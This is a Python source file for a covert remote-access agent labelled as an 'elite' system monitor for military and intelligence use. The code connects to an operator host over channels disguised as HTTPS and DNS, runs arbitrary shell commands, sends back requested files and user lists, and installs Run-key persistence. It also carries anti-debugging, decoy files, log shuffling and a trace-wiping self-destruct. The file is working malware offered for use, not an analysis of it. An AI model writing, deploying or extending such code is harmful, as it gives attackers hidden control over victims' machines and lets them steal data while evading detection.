#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Elite Remote System Monitor - Advanced cross-platform monitoring with covert capabilities
For authorized military and intelligence use only
"""

import os
import sys
import time
import json
import zlib
import socket
import hashlib
import base64
import logging
import threading
import platform
import subprocess
import select
from datetime import datetime
from pathlib import Path
from queue import Queue
import ctypes
import tempfile
import shutil

# Stealth imports with fallbacks
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

try:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

# Constants
DEFAULT_MAX_LOG_SIZE = 1024000  # 1MB
SECURE_LOG_DIR = "SystemHealth"
CONTROL_PORT = 443  # HTTPS port for stealth
DATA_PORT = 53  # DNS port for stealth
COMMAND_INTERVAL = 300  # 5 minutes
SELF_DESTRUCT_CODE = "EXITIMMEDIATELY"

class CovertCommunication:
    """Advanced covert communication channel with DNS/HTTPS camouflage"""
    def __init__(self, config):
        self.config = config
        self.command_queue = Queue()
        self.response_queue = Queue()
        self._running = False
        self._socket = None
        self._control_socket = None
        self._current_ip = None
        self._init_sockets()

    def _init_sockets(self):
        """Initialize covert communication sockets"""
        try:
            # Data channel (DNS-like)
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Control channel (HTTPS-like)
            self._control_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._control_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._control_socket.settimeout(30)
        except Exception as e:
            logging.error("Socket initialization failed: %s", str(e))

    def start(self, remote_ip):
        """Establish connection to remote handler"""
        self._running = True
        self._current_ip = remote_ip
        
        # Start receiver threads
        threading.Thread(target=self._receive_data, daemon=True).start()
        threading.Thread(target=self._receive_commands, daemon=True).start()
        threading.Thread(target=self._send_responses, daemon=True).start()

    def stop(self):
        """Terminate all communications"""
        self._running = False
        if self._socket:
            self._socket.close()
        if self._control_socket:
            self._control_socket.close()

    def _receive_data(self):
        """Receive data through covert channel"""
        while self._running:
            try:
                ready = select.select([self._socket], [], [], 1)
                if ready[0]:
                    data, _ = self._socket.recvfrom(65535)
                    decrypted = self.config.crypto.decrypt(data)
                    if decrypted.startswith(b'CMD:'):
                        self.command_queue.put(decrypted[4:].decode())
                    elif decrypted == SELF_DESTRUCT_CODE.encode():
                        self.command_queue.put(SELF_DESTRUCT_CODE)
            except Exception as e:
                logging.debug("Data receive error: %s", str(e))
                time.sleep(5)

    def _receive_commands(self):
        """Receive commands through control channel"""
        while self._running:
            try:
                if not self._control_socket:
                    time.sleep(5)
                    continue
                    
                self._control_socket.connect((self._current_ip, CONTROL_PORT))
                while self._running:
                    data = self._control_socket.recv(4096)
                    if not data:
                        time.sleep(10)
                        continue
                        
                    decrypted = self.config.crypto.decrypt(data)
                    if decrypted == SELF_DESTRUCT_CODE.encode():
                        self.command_queue.put(SELF_DESTRUCT_CODE)
                    else:
                        self.command_queue.put(decrypted.decode())
            except Exception as e:
                logging.debug("Command receive error: %s", str(e))
                time.sleep(30)
                self._init_sockets()

    def _send_responses(self):
        """Send responses back through covert channel"""
        while self._running:
            try:
                if not self.response_queue.empty():
                    response = self.response_queue.get()
                    encrypted = self.config.crypto.encrypt(response.encode())
                    self._socket.sendto(encrypted, (self._current_ip, DATA_PORT))
            except Exception as e:
                logging.debug("Response send error: %s", str(e))
            time.sleep(0.1)

    def send_command(self, command):
        """Send command to remote agent"""
        encrypted = self.config.crypto.encrypt(command.encode())
        self._socket.sendto(encrypted, (self._current_ip, DATA_PORT))

class EliteConfig:
    """Advanced configuration with anti-tampering"""
    def __init__(self):
        self._config = {
            'monitoring': {
                'max_log_size': DEFAULT_MAX_LOG_SIZE,
                'stealth_mode': True,
                'persistence': self._get_persistence_method(),
                'exfiltration': {
                    'interval': COMMAND_INTERVAL,
                    'chunk_size': 512,
                    'jitter': 0.3
                }
            }
        }
        self._key = self._derive_key() if CRYPTO_AVAILABLE else None
        self._validate_config()

    def _derive_key(self):
        """Derive encryption key using system fingerprint"""
        salt = b'\x1a\x2f\x3e\x4c\x5d\x6b\x7a\x89'  # Embedded salt
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA3_512(),
            length=32,
            salt=salt,
            iterations=150000,
            backend=default_backend()
        )
        return kdf.derive(self._system_fingerprint().encode())

    def _system_fingerprint(self):
        """Generate unique system identifier"""
        safe_attrs = [
            platform.machine(),
            str(os.cpu_count()),
            hashlib.sha3_256(platform.node().encode()).hexdigest()[:12],
            str(ctypes.sizeof(ctypes.c_voidp) * 8)
        ]
        return ':'.join(safe_attrs)

    def _get_persistence_method(self):
        """Determine best persistence method for platform"""
        if sys.platform == 'win32':
            return 'registry'
        elif sys.platform == 'darwin':
            return 'launchd'
        else:
            return 'cron'

    def _validate_config(self):
        """Validate config integrity"""
        checksum = hashlib.sha3_256(json.dumps(self._config).encode()).hexdigest()
        if not hasattr(self, '_config_checksum'):
            self._config_checksum = checksum
        elif self._config_checksum != checksum:
            logging.warning("Config tampering detected!")
            self._self_destruct()

    def _self_destruct(self):
        """Initiate self-destruct sequence"""
        logging.info("Initiating self-destruct sequence")
        try:
            self._remove_persistence()
            self._cleanup_traces()
            os._exit(0)
        except:
            os._exit(1)

    def _remove_persistence(self):
        """Remove all persistence mechanisms"""
        if self._config['monitoring']['persistence'] == 'registry':
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(key, "SystemHealthMonitor")
                winreg.CloseKey(key)
            except:
                pass
        # Other persistence removal methods omitted for brevity

    def _cleanup_traces(self):
        """Clean all operational traces"""
        log_dir = Path.home() / SECURE_LOG_DIR
        try:
            shutil.rmtree(log_dir)
        except:
            pass

class EliteCrypto:
    """Military-grade cryptography with obfuscation"""
    def __init__(self, config):
        self.config = config
        self._key = config._key
        self._nonce_counter = 0

    def encrypt(self, data):
        """Encrypt with AES-256-GCM and obfuscation"""
        if not isinstance(data, bytes):
            data = str(data).encode('utf-8')

        if not CRYPTO_AVAILABLE or not self._key:
            return self._simple_obfuscate(data)

        # Compress before encryption
        data = zlib.compress(data)
        
        # Use counter-based nonce for better security
        nonce = (self._nonce_counter.to_bytes(12, 'big') + os.urandom(4))[:12]
        self._nonce_counter += 1
        
        cipher = Cipher(
            algorithms.AES(self._key),
            modes.GCM(nonce),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        
        # Add random padding
        padding = os.urandom(8)
        return nonce + encryptor.tag + ciphertext + padding

    def decrypt(self, data):
        """Decrypt with integrity checking"""
        if not CRYPTO_AVAILABLE or not self._key:
            return self._simple_deobfuscate(data)

        try:
            # Strip random padding
            data = data[:-8]
            
            nonce = data[:12]
            tag = data[12:28]
            ciphertext = data[28:]
            
            cipher = Cipher(
                algorithms.AES(self._key),
                modes.GCM(nonce, tag),
                backend=default_backend()
            )
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Decompress after decryption
            return zlib.decompress(decrypted)
        except Exception as e:
            logging.error("Decryption failed: %s", str(e))
            return b''

    def _simple_obfuscate(self, data):
        """Fallback obfuscation when crypto unavailable"""
        return base64.b64encode(data[::-1])

    def _simple_deobfuscate(self, data):
        """Fallback deobfuscation"""
        return base64.b64decode(data)[::-1]

class RemoteControl:
    """Advanced remote control capabilities"""
    def __init__(self, config, crypto, comm):
        self.config = config
        self.crypto = crypto
        self.comm = comm
        self._running = False
        self._last_command_time = 0

    def start(self):
        """Start remote control handler"""
        self._running = True
        threading.Thread(target=self._command_loop, daemon=True).start()

    def stop(self):
        """Stop remote control"""
        self._running = False

    def _command_loop(self):
        """Process incoming commands"""
        while self._running:
            try:
                if not self.comm.command_queue.empty():
                    command = self.comm.command_queue.get()
                    
                    if command == SELF_DESTRUCT_CODE:
                        self._execute_self_destruct()
                        continue
                        
                    result = self._execute_command(command)
                    self.comm.response_queue.put(result)
                    
                time.sleep(0.1)
            except Exception as e:
                logging.error("Command processing error: %s", str(e))
                time.sleep(1)

    def _execute_command(self, command):
        """Execute remote command securely"""
        try:
            if command.startswith("shell:"):
                cmd = command[6:]
                result = subprocess.run(cmd, shell=True, check=True,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                return result.stdout.decode()
                
            elif command == "get_system_info":
                return self._get_system_info()
                
            elif command == "get_logs":
                return self._get_logs()
                
            elif command.startswith("download:"):
                filepath = command[9:]
                return self._read_file(filepath)
                
            else:
                return f"Unknown command: {command}"
        except Exception as e:
            return f"Command failed: {str(e)}"

    def _execute_self_destruct(self):
        """Execute complete self-destruct"""
        logging.info("Received self-destruct command")
        self.config._self_destruct()

    def _get_system_info(self):
        """Collect comprehensive system information"""
        info = {
            'system': {
                'platform': platform.platform(),
                'hostname': platform.node(),
                'architecture': platform.architecture(),
                'processor': platform.processor(),
                'fingerprint': self.config._system_fingerprint()
            },
            'users': self._get_user_list(),
            'network': self._get_network_info(),
            'processes': self._get_process_list()
        }
        return json.dumps(info)

    def _get_logs(self):
        """Retrieve collected logs"""
        log_file = Path.home() / SECURE_LOG_DIR / 'activity.log'
        if log_file.exists():
            return self._read_file(str(log_file))
        return "No logs available"

    def _read_file(self, filepath):
        """Securely read file contents"""
        try:
            with open(filepath, 'rb') as f:
                return f.read().decode(errors='replace')
        except Exception as e:
            return f"File read error: {str(e)}"

    def _get_user_list(self):
        """Get system user list"""
        if sys.platform == 'win32':
            try:
                output = subprocess.check_output("net user", shell=True)
                return output.decode()
            except:
                return "Unable to retrieve user list"
        else:
            try:
                with open('/etc/passwd') as f:
                    return f.read()
            except:
                return "Unable to retrieve user list"

    def _get_network_info(self):
        """Get detailed network information"""
        if not PSUTIL_AVAILABLE:
            return "psutil not available"
            
        info = {}
        try:
            info['interfaces'] = []
            for name, addrs in psutil.net_if_addrs().items():
                interface = {'name': name, 'addresses': []}
                for addr in addrs:
                    interface['addresses'].append({
                        'family': str(addr.family),
                        'address': addr.address,
                        'netmask': addr.netmask
                    })
                info['interfaces'].append(interface)
                
            info['connections'] = []
            for conn in psutil.net_connections(kind='inet'):
                info['connections'].append({
                    'family': str(conn.family),
                    'type': str(conn.type),
                    'laddr': str(conn.laddr),
                    'raddr': str(conn.raddr) if conn.raddr else None,
                    'status': conn.status,
                    'pid': conn.pid
                })
        except Exception as e:
            info['error'] = str(e)
            
        return info

    def _get_process_list(self):
        """Get running process list"""
        if not PSUTIL_AVAILABLE:
            return "psutil not available"
            
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'user': proc.info['username'],
                    'cmd': ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                })
            except:
                continue
        return processes

class EliteLogger:
    """Advanced logging with anti-forensics"""
    def __init__(self, config, crypto):
        self.config = config
        self.crypto = crypto
        self._buffer = []
        self._lock = threading.Lock()
        self._log_file = self._init_log_file()
        self._log_count = 0

    def _init_log_file(self):
        """Initialize secure log directory with anti-forensic measures"""
        log_dir = Path.home() / SECURE_LOG_DIR
        log_dir.mkdir(mode=0o700, exist_ok=True)
        
        # Create decoy files
        decoys = ['system_health.log', 'network_monitor.log', 'user_activity.log']
        for decoy in decoys:
            with open(log_dir / decoy, 'w') as f:
                f.write("Normal system monitoring logs\n" * 100)
        
        return log_dir / f"{int(time.time())}.dat"

    def log(self, event_type, data):
        """Secure logging with anti-forensic techniques"""
        with self._lock:
            # Add random noise to timestamps
            jitter = (random.random() - 0.5) * 60
            timestamp = datetime.utcfromtimestamp(time.time() + jitter).isoformat() + 'Z'
            
            event = {
                'seq': self._log_count,
                'timestamp': timestamp,
                'type': event_type,
                'data': data
            }
            self._log_count += 1
            
            # Add random noise events
            if random.random() < 0.05:
                noise_event = {
                    'seq': self._log_count,
                    'timestamp': timestamp,
                    'type': 'noise',
                    'data': {'random': random.random()}
                }
                self._log_count += 1
                self._buffer.append(noise_event)
            
            self._buffer.append(event)
            
            if len(self._buffer) >= 100 or len(str(self._buffer)) > 50000:
                self._flush_buffer()

    def _flush_buffer(self):
        """Flush logs with anti-forensic measures"""
        if not self._buffer:
            return
            
        try:
            # Shuffle log entries
            random.shuffle(self._buffer)
            
            # Encrypt and write
            encrypted = self.crypto.encrypt(json.dumps(self._buffer).encode())
            
            # Write with random filename
            temp_file = self._log_file.parent / f"tmp_{random.randint(1000,9999)}.dat"
            with open(temp_file, 'wb') as f:
                f.write(encrypted)
            
            # Rename with atomic operation
            temp_file.rename(self._log_file)
            
            self._buffer = []
        except Exception as e:
            logging.error("Log write failed: %s", str(e))

class EliteAgent:
    """Main elite agent class"""
    def __init__(self, remote_ip=None):
        self.config = EliteConfig()
        self.crypto = EliteCrypto(self.config) if CRYPTO_AVAILABLE else None
        self.comm = CovertCommunication(self.config)
        self.control = RemoteControl(self.config, self.crypto, self.comm)
        self.logger = EliteLogger(self.config, self.crypto)
        self._running = False
        self._remote_ip = remote_ip

    def start(self):
        """Start agent with all components"""
        self._running = True
        
        # Establish covert communication
        if self._remote_ip:
            self.comm.start(self._remote_ip)
            self.control.start()
        
        # Start monitoring threads
        threading.Thread(target=self._system_monitor, daemon=True).start()
        threading.Thread(target=self._network_monitor, daemon=True).start()
        threading.Thread(target=self._persistence_check, daemon=True).start()
        
        # Main loop
        while self._running:
            time.sleep(1)

    def stop(self):
        """Stop agent with cleanup"""
        self._running = False
        self.comm.stop()
        self.control.stop()

    def _system_monitor(self):
        """Comprehensive system monitoring"""
        while self._running:
            try:
                self._check_resources()
                self._check_processes()
                self._check_integrity()
                time.sleep(60)
            except Exception as e:
                self.logger.log('monitor_error', {'error': str(e)})
                time.sleep(10)

    def _network_monitor(self):
        """Advanced network monitoring"""
        while self._running:
            try:
                self._check_connections()
                self._check_listening_ports()
                time.sleep(300)
            except Exception as e:
                self.logger.log('network_error', {'error': str(e)})
                time.sleep(30)

    def _persistence_check(self):
        """Ensure persistence mechanism is active"""
        while self._running:
            try:
                self._install_persistence()
                time.sleep(86400)  # Check daily
            except Exception as e:
                self.logger.log('persistence_error', {'error': str(e)})
                time.sleep(3600)

    def _check_resources(self):
        """Monitor system resources"""
        if PSUTIL_AVAILABLE:
            self.logger.log('system_resources', {
                'cpu': psutil.cpu_percent(interval=1),
                'memory': psutil.virtual_memory().percent,
                'disks': {d.mountpoint: psutil.disk_usage(d.mountpoint).percent 
                         for d in psutil.disk_partitions()},
                'temperature': self._get_temperatures()
            })

    def _get_temperatures(self):
        """Get hardware temperatures if available"""
        if not PSUTIL_AVAILABLE:
            return None
            
        try:
            temps = {}
            if hasattr(psutil, "sensors_temperatures"):
                for name, entries in psutil.sensors_temperatures().items():
                    temps[name] = [e.current for e in entries]
            return temps
        except:
            return None

    def _check_processes(self):
        """Monitor critical processes"""
        if PSUTIL_AVAILABLE:
            critical_procs = ['lsass.exe', 'csrss.exe', 'explorer.exe'] if sys.platform == 'win32' else \
                            ['sshd', 'init', 'systemd']
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in critical_procs]:
                        self.logger.log('critical_process', {
                            'name': proc.info['name'],
                            'status': proc.status()
                        })
                except:
                    continue

    def _check_connections(self):
        """Monitor network connections"""
        if PSUTIL_AVAILABLE:
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                connections.append({
                    'family': str(conn.family),
                    'type': str(conn.type),
                    'laddr': str(conn.laddr),
                    'raddr': str(conn.raddr) if conn.raddr else None,
                    'status': conn.status,
                    'pid': conn.pid
                })
            self.logger.log('network_connections', {'connections': connections})

    def _check_listening_ports(self):
        """Monitor listening ports"""
        if PSUTIL_AVAILABLE:
            listeners = []
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN':
                    listeners.append({
                        'family': str(conn.family),
                        'type': str(conn.type),
                        'laddr': str(conn.laddr),
                        'pid': conn.pid
                    })
            self.logger.log('listening_ports', {'ports': listeners})

    def _check_integrity(self):
        """Check critical system files"""
        critical_files = self._get_critical_files()
        for fpath in critical_files:
            if fpath.exists():
                try:
                    stat = fpath.stat()
                    self.logger.log('file_check', {
                        'path': str(fpath),
                        'size': stat.st_size,
                        'mtime': stat.st_mtime,
                        'hash': self._file_hash(fpath)
                    })
                except Exception as e:
                    self.logger.log('file_error', {
                        'path': str(fpath),
                        'error': str(e)
                    })

    def _get_critical_files(self):
        """Get platform-specific critical files"""
        system_files = []
        if sys.platform == 'win32':
            system_files.extend([
                Path(os.environ.get('SystemRoot', r'C:\Windows')) / 'System32' / 'drivers' / 'etc' / 'hosts',
                Path(os.environ.get('ProgramData')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup',
                Path(os.environ.get('SystemRoot')) / 'System32' / 'cmd.exe'
            ])
        else:
            system_files.extend([
                Path('/etc/passwd'),
                Path('/etc/shadow'),
                Path('/etc/hosts'),
                Path('/etc/sudoers'),
                Path.home() / '.ssh' / 'authorized_keys',
                Path('/bin/bash')
            ])
        return [f for f in system_files if f.is_file()]

    def _file_hash(self, path):
        """Calculate secure file hash"""
        h = hashlib.sha3_256()
        with open(path, 'rb') as f:
            while chunk := f.read(4096):
                h.update(chunk)
        return h.hexdigest()

    def _install_persistence(self):
        """Install persistence mechanism"""
        if self.config._config['monitoring']['persistence'] == 'registry':
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_ALL_ACCESS)
                winreg.SetValueEx(key, "SystemHealthMonitor", 0, winreg.REG_SZ, sys.executable)
                winreg.CloseKey(key)
                return True
            except Exception as e:
                self.logger.log('persistence_error', {'error': str(e)})
                return False
        # Other persistence methods omitted for brevity
        return False

def main():
    """Main entry point with stealth measures"""
    # Check if we should run in client or server mode
    if len(sys.argv) > 1 and sys.argv[1].startswith('--connect='):
        remote_ip = sys.argv[1].split('=')[1]
    else:
        remote_ip = None

    # Stealth measures
    if hasattr(sys, 'frozen'):
        # Running as compiled executable
        logging.basicConfig(level=logging.CRITICAL)
    else:
        # Running as script - minimal logging
        logging.basicConfig(level=logging.CRITICAL, filename=os.devnull)

    # Anti-debugging check
    try:
        if sys.gettrace() is not None:
            os._exit(1)
    except:
        pass

    agent = EliteAgent(remote_ip)
    try:
        agent.start()
    except KeyboardInterrupt:
        agent.stop()
    except Exception as e:
        logging.critical("Fatal error: %s", str(e))
        sys.exit(1)

if __name__ == "__main__":
    import random
    main()